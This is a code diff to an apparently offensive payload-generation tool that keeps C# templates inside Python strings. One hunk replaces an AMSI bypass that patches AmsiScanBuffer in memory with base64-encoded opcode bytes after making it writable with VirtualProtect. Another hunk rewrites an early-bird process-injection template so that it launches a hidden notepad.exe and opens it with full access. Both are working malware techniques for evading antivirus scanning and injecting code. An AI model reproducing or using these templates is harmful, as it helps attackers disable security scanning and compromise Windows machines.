@@ -27,17 +27,17 @@ AMSI_BYPASS_IMPORT = """
 """
 
 AMSI_BYPASS_CODE = """
-IntPtr TargetDLL = LoadLibrary("amsi.dll");
-IntPtr AmsiScanBufrPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer");
-UIntPtr dwSize = (UIntPtr)4;
-uint Zero = 0;
-VirtualProtect(AmsiScanBufrPtr, dwSize, 0x40, out Zero);
-Byte[] Patch = { 0x31, 0xff, 0x90 }; //The new patch opcode
-IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
-Marshal.Copy(Patch, 0, unmanagedPointer, 3);
+        var lib = LoadLibrary("amsi.dll");
+        var asb = GetProcAddress(lib, "AmsiScanBuffer");
+        var patch = Convert.FromBase64String("uFcAB4DD");
 
-//Patching the relevant line (the line which submits the rd8 to the edi register) with the xor edi,edi opcode
-MoveMemory(AmsiScanBufrPtr + 0x001b, unmanagedPointer, 3); 
+        if (!is64Bit())
+            patch = Convert.FromBase64String("uFcAB4DCGAA=");
+
+        _ = VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
+        Marshal.Copy(patch, 0, asb, patch.Length);
+        VirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, out uint _);
+
 """
 
 ETW_FUNCS = """
@@ -501,16 +501,16 @@ START_PROCESS_EARLYBIRD_IMPORT = """
 """
 
 START_PROCESS_EARLYBIRD_CODE = """
-          //ProcessStartInfo start = new ProcessStartInfo();
-          //start.Arguments = ""; 
-          //start.FileName = "notepad.exe";
-          //start.WindowStyle = ProcessWindowStyle.Hidden;
-          //start.CreateNoWindow = true;
-          //int exitCode;
-          //// Run the external process & wait for it to finish
-          //using (Process proc = Process.Start(start))
-          //{
-            Process[] expProc = Process.GetProcessesByName("explorer");
+          ProcessStartInfo start = new ProcessStartInfo();
+          start.Arguments = ""; 
+          start.FileName = "notepad.exe";
+          start.WindowStyle = ProcessWindowStyle.Hidden;
+          start.CreateNoWindow = true;
+          int exitCode;
+          // Run the external process & wait for it to finish
+          using (Process proc = Process.Start(start))
+          {
+            Process[] expProc = Process.GetProcessesByName("notepad");
             for (int i = 0; i < expProc.Length; i++) {
             
             IntPtr Process_handle = OpenProcess((uint)ProcessAccessFlags.All, false, expProc[i].Id);
@@ -543,7 +543,7 @@ START_PROCESS_EARLYBIRD_CODE = """
             CloseHandle(Process_handle);
             CloseHandle(Thread_handle);
             }
-            //}
+            }
 """
 
 class Obfuscator:
